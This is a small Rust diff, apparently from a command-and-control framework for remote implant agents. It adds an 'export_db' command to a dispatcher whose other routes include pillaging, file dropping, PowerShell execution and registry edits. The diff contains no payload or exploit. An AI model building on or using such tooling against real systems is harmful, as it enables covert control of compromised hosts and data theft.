@@ -7,7 +7,7 @@ use crate::{
     net::{Credentials, IsTaskingAgent},
     tasks::task_impl::{
         FileOperationTarget, RegOperationDelQuery, TaskDispatchError, change_directory,
-        clear_terminal, copy_file, dir_listing, file_dropper, kill_agent, kill_process,
+        clear_terminal, copy_file, dir_listing, export_db, file_dropper, kill_agent, kill_process,
         list_processes, move_file, pillage, pull_file, pwd, reg_add, reg_query_del, remove_agent,
         remove_file, run_powershell_command, set_sleep, show_help, show_help_for_command,
         show_server_time, unknown_command,
@@ -59,6 +59,7 @@ async fn dispatcher(
         ["help", arg] => show_help_for_command(&agent, state, arg).await,
 
         // on &agent
+        ["export_db"] => export_db(creds, &agent).await,
         ["set", "sleep", time] => set_sleep(time, creds, &agent).await,
         ["ps"] => list_processes(creds, &agent).await,
         ["cd", pat @ ..] => change_directory(pat, creds, &agent).await,
